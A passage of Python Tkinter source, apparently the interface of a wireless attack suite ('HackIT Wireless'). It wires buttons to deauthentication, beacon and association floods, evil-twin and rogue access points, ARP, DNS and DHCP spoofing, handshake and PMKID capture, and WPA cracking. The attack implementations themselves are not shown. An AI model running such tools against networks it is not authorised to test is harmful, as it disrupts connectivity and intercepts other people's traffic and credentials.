            lbl.pack(side="left", padx=(0,5))
            if band:
                bdg = tk.Label(self.iface_container, text=band, font=("Segoe UI",6,"bold"),
                               bg=T["accent"] if "5" in band else T["orange"], fg=T["bg"], padx=2)
                bdg.pack(side="left", padx=(0,5))
            lbl.bind("<Button-1>", lambda e, n=iface["name"], m=iface["mode"]: self._do_toggle(n, m))
            lbl.bind("<Enter>", lambda e, l=lbl: l.configure(bg=T["hover"]))
            lbl.bind("<Leave>", lambda e, l=lbl: l.configure(bg=T["card"]))
        if not self.interface_cache:
            tk.Label(self.iface_container, text="  No wireless interfaces", font=("Segoe UI",7),
                     bg=T["card"], fg=T["error"]).pack(side="left")

    def _refresh_interfaces(self):
        def worker():
            while True:
                try:
                    self.interface_cache = get_interfaces()
                    self.root.after(0, self._render_iface_bar)
                except: pass
                time.sleep(5)
        threading.Thread(target=worker, daemon=True).start()

    def _do_toggle(self, name, mode):
        threading.Thread(target=lambda: (toggle_monitor(name, mode), time.sleep(2),
                         setattr(self, 'interface_cache', get_interfaces()),
                         self.root.after(0, self._render_iface_bar)), daemon=True).start()

    # ── Page management ──
    def _create_pages(self):
        self.pages = {k: builder() for k, builder in [
            ("dashboard", self._build_dashboard), ("interfaces", self._build_interfaces),
            ("recon", self._build_recon), ("attacks", self._build_attacks),
            ("offensive", self._build_offensive), ("cracking", self._build_cracking),
            ("airodump", self._build_airodump), ("plugins", self._build_plugins),
            ("build", self._build_build),
        ]}

    def _navigate(self, key):
        for k, btn in self.nav_btns.items():
            btn.configure(bg=T["surface"] if k==key else T["bg"],
                          fg=T["text_bright"] if k==key else T["text_dim"])
        if self.current_page and self.current_page in self.pages:
            self.pages[self.current_page].pack_forget()
        self.current_page = key
        if key in self.pages:
            self.pages[key].pack(fill="both", expand=True)

    def _on_close(self):
        for tid, pinfo in self.active_processes.items():
            try:
                proc = pinfo.get("proc")
                if proc: proc.terminate()
            except: pass
        self.root.destroy()

    def _clear_console(self):
        self.console.config(state="normal"); self.console.delete("1.0","end"); self.console.config(state="disabled")

    def _console_write(self, text, tag=None):
        self.console.config(state="normal")
        self.console.insert("end", f"[{datetime.now().strftime('%H:%M:%S')}] ", "dim")
        self.console.insert("end", text + "\n", tag or "")
        self.console.see("end"); self.console.config(state="disabled")

    def _poll_console(self):
        try:
            while True:
                line, color = CONSOLE_QUEUE.get_nowait()
                self._console_write(line, color)
        except queue.Empty: pass
        self.root.after(100, self._poll_console)

    def _build_status_bar(self):
        bar = tk.Frame(self.root, bg=T["card"], height=22)
        bar.pack(side="bottom", fill="x"); bar.pack_propagate(False)
        self.status_attacks = tk.Label(bar, text="\u2694 0 active", font=("Segoe UI",7),
                                        bg=T["card"], fg=T["text_dim"])
        self.status_attacks.pack(side="left", padx=(10,0))
        self.status_interfaces = tk.Label(bar, text="\U0001f4e1 0 ifaces", font=("Segoe UI",7),
                                           bg=T["card"], fg=T["text_dim"])
        self.status_interfaces.pack(side="left", padx=(6,0))
        self.status_dualband = tk.Label(bar, text="", font=("Segoe UI",7),
                                         bg=T["card"], fg=T["text_dim"])
        self.status_dualband.pack(side="left", padx=(6,0))
        self.status_time = tk.Label(bar, text=datetime.now().strftime("%H:%M:%S"),
                                     font=("Segoe UI",7), bg=T["card"], fg=T["text_dim"])
        self.status_time.pack(side="right", padx=(0,10))
        self._update_status_bar()

    def _update_status_bar(self):
        n_active = len(self.active_processes)
        n_iface = len(self.interface_cache)
        n_mon = sum(1 for i in self.interface_cache if i["mode"] == "monitor")
        n5 = sum(1 for i in self.interface_cache if 5000 <= i.get("freq",0) <= 6000)
        n24 = sum(1 for i in self.interface_cache if 2400 <= i.get("freq",0) <= 2500)
        has_dual = n24 > 0 and n5 > 0
        self.status_attacks.configure(text=f"\u2694 {n_active} active" + (" \U0001f534" if n_active > 0 else ""),
                                       fg=T["error"] if n_active > 0 else T["text_dim"])
        self.status_interfaces.configure(text=f"\U0001f4e1 {n_iface} ifaces ({n_mon} mon)")
        self.status_dualband.configure(text="\U0001f501 Dual-Band" if has_dual else
                                        ("2.4GHz" if n24 > 0 else "5GHz") if n_iface > 0 else "",
                                        fg=T["accent"] if has_dual else T["text_dim"])
        self.status_time.configure(text=datetime.now().strftime("%H:%M:%S"))
        self.root.after(2000, self._update_status_bar)

    def _update_engine_status(self):
        eh = engine_health if isinstance(engine_health, dict) else {}
        for eng, lbl in self.engine_labels.items():
            ok = eh.get(eng, False)
            lbl.configure(fg=T["success"] if ok else T["error"], text="\u2b24" if ok else "\u25cb")
        self.root.after(5000, self._update_engine_status)

    def _build_card(self, p, title, widgets=None):
        f = tk.Frame(p, bg=T["card"], highlightbackground=T["border"], highlightthickness=1)
        hdr = tk.Frame(f, bg=T["card"]); hdr.pack(fill="x", padx=10, pady=(6,2))
        tk.Label(hdr, text=title, font=("Segoe UI",10,"bold"), bg=T["card"], fg=T["accent"]).pack(anchor="w")
        if widgets:
            for w in widgets: w.pack(padx=10, pady=1, fill="x")
        return f

    def _btn(self, parent, text, cmd, primary=False, w=None):
        fg = T["bg"] if primary else T["fg"]; bg = T["accent"] if primary else T["surface"]
        ab = T["select"] if primary else T["hover"]
        btn = tk.Button(parent, text=text, command=cmd, font=("Segoe UI",9,"bold") if primary else ("Segoe UI",8),
                        bg=bg, fg=fg, activebackground=ab, activeforeground=fg,
                        relief="flat", padx=12, pady=3, cursor="hand2", borderwidth=0, width=w)
        btn.bind("<Enter>", lambda e, b=btn, a=ab: b.configure(bg=a))
        btn.bind("<Leave>", lambda e, b=btn, o=bg: b.configure(bg=o))
        return btn

    def _entry(self, parent, w=28, default=""):
        v = tk.StringVar(value=str(default))
        e = tk.Entry(parent, textvariable=v, font=("Segoe UI",9), bg=T["surface"], fg=T["fg"],
                     insertbackground=T["accent"], relief="flat", borderwidth=0, width=w)
        return e, v

    def _labeled(self, parent, label, default="", w=26):
        r = tk.Frame(parent, bg=T["bg"]); r.pack(fill="x", pady=1)
        tk.Label(r, text=label, font=("Segoe UI",8), bg=T["bg"], fg=T["text_dim"], width=10, anchor="w").pack(side="left")
        e, v = self._entry(r, w, default); e.pack(side="left", padx=(4,0))
        return r, e, v

    def _exec_async(self, func, args=(), kwargs=None, cb=None):
        def worker():
            try:
                r = func(*args, **(kwargs or {}))
                if cb: self.root.after(0, cb, r)
            except Exception as e:
                tslog(f"[x] {e}", "red")
                if cb: self.root.after(0, cb, None)
        threading.Thread(target=worker, daemon=True).start()

    def _run_system_bg(self, cmd, label="Cmd"):
        def worker():
            try:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                        text=True, bufsize=1, shell=isinstance(cmd, str))
                for line in proc.stdout:
                    line = line.rstrip()
                    if line: tslog(f"[>] {line}", "cyan")
                proc.wait()
                tslog(f"[\u2713] {label} done" if proc.returncode==0 else f"[x] {label} fail ({proc.returncode})",
                      "green" if proc.returncode==0 else "red")
            except Exception as e:
                tslog(f"[x] {label}: {e}", "red")
        threading.Thread(target=worker, daemon=True).start()

    def _run_exec(self, method_name, params, label="Attack"):
        thread_id = f"{method_name}-{int(time.time()*1000)}"
        self.active_processes[thread_id] = {"label": label, "start": time.time(), "status": "running"}
        def worker():
            try:
                method = getattr(executor, method_name, None)
                if not method:
                    tslog(f"[x] Method {method_name} not found", "red")
                    self.active_processes[thread_id]["status"] = "error"
                    return
                sig = inspect.signature(method)
                coerced = {}
                for k, v in params.items():
                    if k in sig.parameters:
                        ann = sig.parameters[k].annotation
                        if ann is int:
                            try: coerced[k] = int(v)
                            except: coerced[k] = v
                        elif ann is float:
                            try: coerced[k] = float(v)
                            except: coerced[k] = v
                        elif ann is bool:
                            coerced[k] = v in ("true","True","1","on",True,1)
                        else: coerced[k] = v
                    else: coerced[k] = v
                method(**coerced)
                self.active_processes[thread_id]["status"] = "completed"
            except Exception as e:
                tslog(f"[x] {label}: {e}", "red")
                self.active_processes[thread_id]["status"] = "error"
            self.root.after(5000, lambda: self.active_processes.pop(thread_id, None))
        threading.Thread(target=worker, daemon=True).start()

    # ── PAGES ──────────────────────────────────────────────────

    def _build_dashboard(self):
        f = tk.Frame(self.content_area, bg=T["bg"])
        r1 = tk.Frame(f, bg=T["bg"]); r1.pack(fill="x", pady=(0,6))
        nmon = sum(1 for i in self.interface_cache if i["mode"]=="monitor")
        ntot = len(self.interface_cache)
        n5ghz = sum(1 for i in self.interface_cache if i.get("freq",0) > 4000)
        n24ghz = sum(1 for i in self.interface_cache if 2400 < i.get("freq",0) < 4000)
        eng_avail = sum(1 for v in engine_health.values() if v)
        eng_total = len(engine_health)
        mode = "LocalExecutor" if isinstance(executor, LocalExecutor) else "Hybrid"
        mode_clr = T["accent"] if not isinstance(executor, LocalExecutor) else T["success"]
        attack_count = len([m for m in dir(executor) if m.startswith("do_") and callable(getattr(executor, m))])
        for title, val, sub, clr in [
            ("\U0001f6e1\ufe0f  Engines", f"{eng_avail}/{eng_total}", "Native", T["accent"] if eng_avail == eng_total else T["warn"]),
            ("\U0001f4e1  Interfaces", f"{ntot}", f"{nmon} mon \u2022 {n24ghz} 2.4G \u2022 {n5ghz} 5G", T["success"] if nmon else T["warn"]),
            ("\u2694\ufe0f  Attacks", str(attack_count), "real system tools", T["success"]),
            ("\U0001f511  Cracking", "hashcat+aircrack", "WPA/WEP/WPA3/PMKID", T["orange"]),
            ("\u26a1  Mode", mode, f"{eng_avail}/{eng_total} engines", mode_clr),
        ]:
            c = tk.Frame(r1, bg=T["card"], highlightbackground=T["border"], highlightthickness=1, width=210, height=85)
            c.pack(side="left", padx=3, expand=True, fill="x"); c.pack_propagate(False)
            tk.Label(c, text=title, font=("Segoe UI",8), bg=T["card"], fg=T["text_dim"]).pack(anchor="nw", padx=10, pady=(8,1))
            tk.Label(c, text=str(val), font=("Segoe UI",18,"bold"), bg=T["card"], fg=clr).pack(anchor="w", padx=10)
            tk.Label(c, text=sub, font=("Segoe UI",7), bg=T["card"], fg=T["text_dim"]).pack(anchor="w", padx=10)

        r2 = tk.Frame(f, bg=T["bg"]); r2.pack(fill="both", expand=True)
        left = tk.Frame(r2, bg=T["bg"]); left.pack(side="left", fill="both", expand=True, padx=(0,3))
        tk.Label(left, text="\U0001f4cb  Activity", font=("Segoe UI",10,"bold"), bg=T["bg"], fg=T["fg"]).pack(anchor="w")
        self.activity_text = tk.Text(left, bg=T["card"], fg=T["text_dim"], font=("Consolas",8),
                                      relief="flat", borderwidth=0, padx=8, pady=4, height=14)
        self.activity_text.pack(fill="both", expand=True)
        self.activity_text.insert("1.0", f"HackIT Wireless v3.0  |  {datetime.now():%Y-%m-%d %H:%M}\n")
        eng_line = " | ".join(f"{k.upper()}={chr(0x2713) if v else chr(0x2717)}" for k,v in engine_health.items())
        self.activity_text.insert("end", f"Engine Health: {eng_line}\n")
        self.activity_text.insert("end", f"Interfaces: {ntot} ({nmon} monitor) \u2022 Dual-Band: {n24ghz > 0 and n5ghz > 0}\n")
        self.activity_text.insert("end", f"Attack Methods: {attack_count}\n")
        self.activity_text.configure(state="disabled")

        right = tk.Frame(r2, bg=T["bg"]); right.pack(side="left", fill="both", expand=True, padx=(3,0))
        tk.Label(right, text="\u26a1  Quick Actions", font=("Segoe UI",10,"bold"), bg=T["bg"], fg=T["fg"]).pack(anchor="w", pady=(0,3))
        qg = tk.Frame(right, bg=T["bg"]); qg.pack(fill="both", expand=True)
        for i,(txt,cmd) in enumerate([("\U0001f50d  Scan", lambda: self._navigate("recon")),
            ("\u2694\ufe0f  Deauth", lambda: self._navigate("attacks")),
            ("\U0001f4a5  Offensive", lambda: self._navigate("offensive")),
            ("\U0001f511  Crack", lambda: self._navigate("cracking")),
            ("\U0001f4e1  Airodump", lambda: self._navigate("airodump")),
            ("\U0001f6e0\ufe0f  Build", lambda: self._navigate("build")),
        ]):
            self._btn(qg, txt, cmd).grid(row=i//3, column=i%3, padx=2, pady=2, sticky="ew")
            qg.columnconfigure(i%3, weight=1)
        return f

    def _build_interfaces(self):
        f = tk.Frame(self.content_area, bg=T["bg"])
        tk.Label(f, text="\U0001f4e1  INTERFACE MANAGER", font=("Segoe UI",14,"bold"), bg=T["bg"], fg=T["fg"]).pack(anchor="nw")
        tk.Label(f, text="Monitor/managed mode toggle, real-time interface info", font=("Segoe UI",9), bg=T["bg"], fg=T["text_dim"]).pack(anchor="nw", pady=(0,6))

        top = tk.Frame(f, bg=T["bg"]); top.pack(fill="x")
        list_frame = tk.Frame(f, bg=T["bg"]); list_frame.pack(fill="both", expand=True)

        def fresh():
            for w in list_frame.winfo_children(): w.destroy()
            ifaces = get_interfaces(); self.interface_cache = ifaces; self._render_iface_bar()
            if not ifaces:
                tk.Label(list_frame, text="No wireless interfaces", font=("Segoe UI",10), bg=T["bg"], fg=T["error"]).pack(pady=30)
                return
            for iface in ifaces:
                card = tk.Frame(list_frame, bg=T["card"], highlightbackground=T["border"], highlightthickness=1, padx=12, pady=8)
                card.pack(fill="x", pady=2)
                topc = tk.Frame(card, bg=T["card"]); topc.pack(fill="x")
                is_mon = iface["mode"]=="monitor"
                dot = "\u2b24" if is_mon else "\u25cb"; clr = T["success"] if is_mon else T["text_dim"]
                tk.Label(topc, text=f"  {iface['name']}", font=("Segoe UI",11,"bold"), bg=T["card"], fg=T["fg"]).pack(side="left")
                tk.Label(topc, text=f"  {dot} {iface['mode'].upper()}", font=("Segoe UI",9), bg=T["card"], fg=clr).pack(side="left", padx=(4,0))
                target_mode = "MANAGED" if is_mon else "MONITOR"
                self._btn(topc, f"\u25b6  {target_mode} MODE",
                          lambda n=iface["name"], m=iface["mode"]: (self._do_toggle(n,m), self.root.after(3000, fresh)),
                          primary=True).pack(side="right")
                det = tk.Frame(card, bg=T["card"]); det.pack(fill="x", pady=(4,0))
                for lab, val in [("PHY",f"phy{iface['phy']}" if iface["phy"] else "-"),
                                 ("Ch",str(iface["channel"]) if iface["channel"] else "-"),
                                 ("Freq",f"{iface['freq']} MHz" if iface["freq"] else "-"),
                                 ("Driver",iface["driver"] or "-")]:
                    tk.Label(det, text=f"{lab}: {val}", font=("Segoe UI",8), bg=T["card"], fg=T["text_dim"]).pack(side="left", padx=(0,12))

        self._btn(top, "\u21bb  Refresh", fresh).pack(side="left", padx=(0,6), pady=4)
        self._btn(top, "\U0001f4e1  Rescan", lambda: (get_interfaces(), fresh()), primary=True).pack(side="left", pady=4)
        fresh()
        return f

    def _build_tool_grid(self, tools, title, desc, color_tag=None):
        """Generic tool grid builder. tools = [(label, method, desc, [(param,default),...])]"""
        f = tk.Frame(self.content_area, bg=T["bg"])
        tk.Label(f, text=title, font=("Segoe UI",14,"bold"), bg=T["bg"], fg=T["fg"]).pack(anchor="nw")
        tk.Label(f, text=desc, font=("Segoe UI",9), bg=T["bg"], fg=T["text_dim"], wraplength=900).pack(anchor="nw", pady=(0,6))

        canvas = tk.Canvas(f, bg=T["bg"], highlightthickness=0, borderwidth=0)
        sb = tk.Scrollbar(f, orient="vertical", command=canvas.yview, bg=T["surface"])
        sf = tk.Frame(canvas, bg=T["bg"])
        sf.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0,0), window=sf, anchor="nw")
        canvas.configure(yscrollcommand=sb.set)
        canvas.pack(side="left", fill="both", expand=True); sb.pack(side="right", fill="y")
        canvas.bind_all("<MouseWheel>", lambda e: canvas.yview_scroll(int(-1*(e.delta/120)), "units"))

        for label, method, desc, params in tools:
            card = tk.Frame(sf, bg=T["card"], highlightbackground=T["border"], highlightthickness=1, padx=10, pady=6)
            card.pack(fill="x", pady=2)
            topc = tk.Frame(card, bg=T["card"]); topc.pack(fill="x")

            if color_tag:
                badge = tk.Label(topc, text=f" {color_tag} ", font=("Segoe UI",7,"bold"),
                                 bg=T.get(color_tag.lower(),T["accent"]), fg=T["bg"], padx=4)
                badge.pack(side="left", padx=(0,4))

            tk.Label(topc, text=label, font=("Segoe UI",10,"bold"), bg=T["card"], fg=T["accent"]).pack(side="left")

            entries = {}
            pr = tk.Frame(card, bg=T["card"]); pr.pack(fill="x", pady=(3,0))
            for pname, pdefault in params:
                pe = tk.Frame(pr, bg=T["card"]); pe.pack(side="left", padx=(0,6))
                tk.Label(pe, text=pname, font=("Segoe UI",7), bg=T["card"], fg=T["text_dim"]).pack(anchor="w")
                e, v = self._entry(pe, 14, str(pdefault)); e.pack()
                entries[pname] = v

            bf = tk.Frame(card, bg=T["card"]); bf.pack(fill="x", pady=(3,0))
            tk.Label(bf, text=desc, font=("Segoe UI",7), bg=T["card"], fg=T["text_dim"]).pack(side="left")
            self._btn(bf, "\u25b6  EXECUTE", lambda m=method, e=entries, l=label: self._run_exec(m, {k:v.get() for k,v in e.items()}, l),
                      primary=True).pack(side="right")
        return f

    def _build_recon(self):
        return self._build_tool_grid([
            ("AP Scan","do_crawl","Scan all APs in range",[("interface", LocalExecutor._detect_iface() or ""),("timeout",15),("band","both")]),
            ("Aggressive Scan","do_aggressive_scan","Deep multi-channel + probes",[("interface", LocalExecutor._detect_iface() or ""),("band","both")]),
            ("Client Hunt","do_client_hunt","Enumerate clients of target AP",[("interface", LocalExecutor._detect_iface() or ""),("bssid","")]),
            ("WPA3 Detect","do_wpa3_detect","Detect WPA3/SAE APs",[("interface", LocalExecutor._detect_iface() or "")]),
            ("Hidden SSID","do_hidden_ssid","Discover hidden non-broadcast SSIDs",[("interface", LocalExecutor._detect_iface() or "")]),
            ("Probe Monitor","do_probe_monitor","Monitor probe requests from clients",[("interface", LocalExecutor._detect_iface() or "")]),
            ("Beacon Analyze","do_beacon_analyze","Analyze beacon frames",[("interface", LocalExecutor._detect_iface() or "")]),
            ("Signal Monitor","do_signal_monitor","Real-time signal per AP",[("interface", LocalExecutor._detect_iface() or "")]),
            ("Spectrum Scan","do_dual_band","Dual-band utilization scan",[("interface", LocalExecutor._detect_iface() or "")]),
            ("Channel Survey","do_channel_survey","Survey utilization all channels",[("interface", LocalExecutor._detect_iface() or "")]),
            ("ARP Scan","do_arp_scan","ARP scan local subnet",[("subnet", LocalExecutor._detect_subnet() or "")]),
            ("Ping Sweep","do_ping_sweep","ICMP sweep subnet",[("subnet", LocalExecutor._detect_subnet() or "")]),
        ], "\U0001f50d  RECONNAISSANCE", "Real wireless recon via airodump-ng, nmap, arp-scan")

    def _build_attacks(self):
        f = tk.Frame(self.content_area, bg=T["bg"])
        tk.Label(f, text="\u2694\ufe0f  ATTACK MODULES", font=("Segoe UI",14,"bold"), bg=T["bg"], fg=T["fg"]).pack(anchor="nw")
        tk.Label(f, text="Real 802.11 attacks via aircrack-ng suite, mdk4, and more", font=("Segoe UI",9), bg=T["bg"], fg=T["text_dim"]).pack(anchor="nw", pady=(0,6))

        categories = {
            "DoS & Disruption": [
                ("DEAUTH","do_deauth","Infinite raw deauth (Ctrl+C to stop)",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("station",""),("reason",7)]),
                ("BEACON FLOOD","do_beacon_flood","Flood fake beacons",[("interface", LocalExecutor._detect_iface() or ""),("ssid",""),("count",500),("channel",6),("band","2.4/5")]),
                ("PROBE FLOOD","do_probe_flood","Mass probe requests",[("interface", LocalExecutor._detect_iface() or ""),("count",1000)]),
                ("AUTH DoS","do_auth_dos","Exhaust AP auth table",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",1000)]),
                ("ASSOC FLOOD","do_assoc_flood","Fill AP client table",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",1000)]),
                ("EAPOL START","do_eapol_start_flood","Trigger reauth flood",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",500)]),
                ("EAPOL LOGOFF","do_eapol_logoff","Disconnect via EAPOL-Logoff",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",500)]),
                ("CTS/RTS FLOOD","do_cts_flood","Jam channel with CTS",[("interface", LocalExecutor._detect_iface() or ""),("count",1000),("duration",500)]),
                ("Power Save DoS","do_powersave_dos","Drain client battery",[("interface", LocalExecutor._detect_iface() or ""),("station",""),("count",2000)]),
                ("Disassoc Flood","do_disassoc_flood","Disassoc flood vs AP",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",1000)]),
            ],
            "MITM & Access": [
                ("EVIL TWIN","do_eviltwin","Clone SSID + rogue AP",[("interface", LocalExecutor._detect_iface() or ""),("ssid",""),("channel",6),("band","2.4/5")]),
                ("ROGUE AP","do_rogue_ap","Fake AP broadcast",[("interface", LocalExecutor._detect_iface() or ""),("ssid",""),("channel",6),("band","2.4/5")]),
                ("ARP SPOOF","do_arp_spoof","MITM via ARP cache poison",[("target",""),("gateway",""),("timeout",120)]),
                ("WPAD Attack","do_wpad_attack","WPAD proxy hijack",[("interface", LocalExecutor._detect_iface() or ""),("ssid","")]),
                ("DNS Spoof","do_dns_spoof","Fake DNS responses",[("interface", LocalExecutor._detect_iface() or ""),("domain",""),("redirect","")]),
                ("DHCP Spoof","do_dhcp_spoof","Rogue DHCP server",[("interface", LocalExecutor._detect_iface() or ""),("pool","")]),
            ],
            "Capture & Extract": [
                ("HANDSHAKE CAPTURE","do_handshake_capture","Capture WPA 4-way",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("timeout",60),("band","2.4/5")]),
                ("PMKID CAPTURE","do_pmkid_capture","Capture PMKID",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("timeout",30),("band","2.4/5")]),
                ("WPS PIXIE","do_wps_pixie","PixieDust WPS PIN",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("timeout",180)]),
                ("WEP ARP REPLAY","do_wep_arp_replay","WEP ARP replay IV gen",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",5000)]),
                ("WEP CHOPCHOP","do_wep_chopchop","ChopChop WEP attack",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",2000)]),
                ("WEP FRAGMENT","do_wep_fragment","Fragmentation PRGA",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",3000)]),
            ],
        }

        canvas = tk.Canvas(f, bg=T["bg"], highlightthickness=0, borderwidth=0)
        sb = tk.Scrollbar(f, orient="vertical", command=canvas.yview, bg=T["surface"])
        sf = tk.Frame(canvas, bg=T["bg"])
        sf.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0,0), window=sf, anchor="nw")
        canvas.configure(yscrollcommand=sb.set)
        canvas.pack(side="left", fill="both", expand=True); sb.pack(side="right", fill="y")
        canvas.bind_all("<MouseWheel>", lambda e: canvas.yview_scroll(int(-1*(e.delta/120)), "units"))

        for cat, attacks in categories.items():
            tk.Label(sf, text=f"\u25bc  {cat}", font=("Segoe UI",11,"bold"), bg=T["bg"], fg=T["purple"]).pack(anchor="w", pady=(6,2))
            for label, method, desc, params in attacks:
                card = tk.Frame(sf, bg=T["card"], highlightbackground=T["border"], highlightthickness=1, padx=10, pady=6)
                card.pack(fill="x", pady=2)
                tc = tk.Frame(card, bg=T["card"]); tc.pack(fill="x")
                tk.Label(tc, text=label, font=("Segoe UI",10,"bold"), bg=T["card"], fg=T["accent"]).pack(side="left")
                entries = {}
                pr = tk.Frame(card, bg=T["card"]); pr.pack(fill="x", pady=(3,0))
                for pn, pd in params:
                    pe = tk.Frame(pr, bg=T["card"]); pe.pack(side="left", padx=(0,5))
                    tk.Label(pe, text=pn, font=("Segoe UI",7), bg=T["card"], fg=T["text_dim"]).pack(anchor="w")
                    e, v = self._entry(pe, 12, str(pd)); e.pack(); entries[pn] = v
                bf = tk.Frame(card, bg=T["card"]); bf.pack(fill="x", pady=(3,0))
                tk.Label(bf, text=desc, font=("Segoe UI",7), bg=T["card"], fg=T["text_dim"]).pack(side="left")
                self._btn(bf, "\u25b6 EXECUTE", lambda m=method, e=entries, l=label: self._run_exec(m, {k:v.get() for k,v in e.items()}, l),
                          primary=True).pack(side="right")
        return f

    def _build_offensive(self):
        f = tk.Frame(self.content_area, bg=T["bg"])
        tk.Label(f, text="\U0001f4a5  OFFENSIVE NETWORK", font=("Segoe UI",14,"bold"), bg=T["bg"], fg=T["fg"]).pack(anchor="nw")
        tk.Label(f, text="Advanced offensive tools: KARMA, MDA, TKIP, WIDS evasion, RRB, CAPWAP, MAC flood",
                 font=("Segoe UI",9), bg=T["bg"], fg=T["text_dim"]).pack(anchor="nw", pady=(0,6))

        # Chains
        tk.Label(f, text="\u26a1  Attack Chains", font=("Segoe UI",10,"bold"), bg=T["bg"], fg=T["orange"]).pack(anchor="w", pady=(2,3))
        cf = tk.Frame(f, bg=T["bg"]); cf.pack(fill="x", pady=(0,4))
        for title, desc, clr in [
            ("Full WPA Crack","Deauth +\nHandshake +\nDictionary",T["accent"]),
            ("WPA3 Downgrade","PMKID +\nHashcat 16800",T["purple"]),
            ("WEP Chain","ARP Replay +\nChopChop +\nFragment",T["warn"]),
            ("MITM Chain","Evil Twin +\nDNS Spoof",T["orange"]),
            ("KARMA","Probe +\nRogue +\nHarvest",T["pink"]),
        ]:
            c = tk.Frame(cf, bg=T["card"], highlightbackground=T["border"], highlightthickness=1, padx=8, pady=5)
            c.pack(side="left", padx=2, expand=True, fill="x")
            tk.Label(c, text=title, font=("Segoe UI",8,"bold"), bg=T["card"], fg=clr).pack(anchor="w")
            tk.Label(c, text=desc, font=("Segoe UI",7), bg=T["card"], fg=T["text_dim"]).pack(anchor="w")

        return self._build_tool_grid([
            ("KARMA Attack","do_karma","Respond all probes",[("interface", LocalExecutor._detect_iface() or ""),("channel",6),("ssid",""),("verbose",False),("band","2.4/5")]),
            ("MDA (Michaely)","do_mda","TKIP MIC exploit",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",100),("band","2.4/5")]),
            ("TKIP MIC Exploit","do_tkip_mic","Forge QoS data",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("station","")]),
            ("WIDS Evasion","do_wids_evasion","Rate-shift evasion",[("interface", LocalExecutor._detect_iface() or ""),("rate",1),("count",100),("band","2.4/5")]),
            ("Fragmentation","do_frag_attack","Frame fragment bypass",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",500)]),
            ("Omerta Attack","do_omerta","Block probe responses",[("interface", LocalExecutor._detect_iface() or ""),("channel",6)]),
            ("EAP Hammer","do_eap_hammer","802.1X DoS",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",500)]),
            ("Key Guessing","do_wpa_key_guess","Offline PMK guess",[("pmkid",""),("ssid",""),("wordlist","")]),
            ("RRB Attack","do_rrb_attack","Beacon injection",[("interface", LocalExecutor._detect_iface() or ""),("bssid","")]),
            ("CAPWAP Attack","do_capwap","CAPWAP control DoS",[("interface", LocalExecutor._detect_iface() or ""),("controller","")]),
            ("HIRB","do_hirb","Hidden IRB bridge",[("interface", LocalExecutor._detect_iface() or ""),("target","")]),
            ("WPA2 Group Key","do_wpa2_groupkey","Force rekey flood",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",200)]),
            ("Bridge Attack","do_bridge_attack","Wireless bridge exploit",[("interface", LocalExecutor._detect_iface() or ""),("bridge_ip","")]),
            ("MAC Flooding","do_mac_flood","Switch CAM flood",[("interface", LocalExecutor._detect_iface() or ""),("count",5000),("rate",100)]),
            ("Known Beacon","do_known_beacon","Enterprise SSIDs",[("interface", LocalExecutor._detect_iface() or ""),("list","enterprise"),("channel",6),("band","2.4/5")]),
        ], "\U0001f4a5  OFFENSIVE NETWORK", "Real offensive tools via mdk4, airbase-ng, macof, hashcat", "Offensive")

    def _build_cracking(self):
        f = tk.Frame(self.content_area, bg=T["bg"])
        tk.Label(f, text="\U0001f511  CRACKING", font=("Segoe UI",14,"bold"), bg=T["bg"], fg=T["fg"]).pack(anchor="nw")
        tk.Label(f, text="Offline cracking via hashcat (WPA2-PMKID, WPA) or aircrack-ng",
                 font=("Segoe UI",9), bg=T["bg"], fg=T["text_dim"]).pack(anchor="nw", pady=(0,6))

        main = tk.Frame(f, bg=T["bg"]); main.pack(fill="both", expand=True)
        left = tk.Frame(main, bg=T["bg"]); left.pack(side="left", fill="both", expand=True, padx=(0,3))
        card = tk.Frame(left, bg=T["card"], highlightbackground=T["border"], highlightthickness=1, padx=12, pady=8)
        card.pack(fill="x")
        tk.Label(card, text="WPA/WPA2 Dictionary Attack", font=("Segoe UI",11,"bold"), bg=T["card"], fg=T["accent"]).pack(anchor="w")
        tk.Label(card, text="Crack captured handshake/PMKID hash with wordlist", font=("Segoe UI",8), bg=T["card"], fg=T["text_dim"]).pack(anchor="w", pady=(2,5))
        entries = {}
        for label, key, ph in [("Hash File","hashfile",".hc22000 / .pcap"),("Wordlist","wordlist","/usr/share/wordlists/..."),
                                ("Rules","rules","Optional rules file"),("Session","session","Optional session name")]:
            r, e, v = self._labeled(card, label, ph); entries[key] = v
        bf = tk.Frame(card, bg=T["card"]); bf.pack(fill="x", pady=(5,0))
        self._btn(bf, "\u25b6  START CRACKING", lambda: self._run_exec("do_crack", {k:v.get() for k,v in entries.items()}, "Crack"),
                  primary=True).pack(side="left")
        self._btn(bf, "\U0001f4c2  Browse", lambda: self._browse_file(entries["hashfile"])).pack(side="left", padx=(5,0))

        right = tk.Frame(main, bg=T["bg"]); right.pack(side="left", fill="both", expand=True, padx=(3,0))
        tk.Label(right, text="\U0001f4c1  Wordlists", font=("Segoe UI",10,"bold"), bg=T["bg"], fg=T["fg"]).pack(anchor="nw")
        wf = tk.Frame(right, bg=T["card"], highlightbackground=T["border"], highlightthickness=1)
        wf.pack(fill="both", expand=True)
        self.wordlist_text = tk.Text(wf, bg=T["card"], fg=T["text_dim"], font=("Consolas",8),
                                      relief="flat", borderwidth=0, padx=8, pady=4)
        self.wordlist_text.pack(fill="both", expand=True)
        def scan():
            found = []
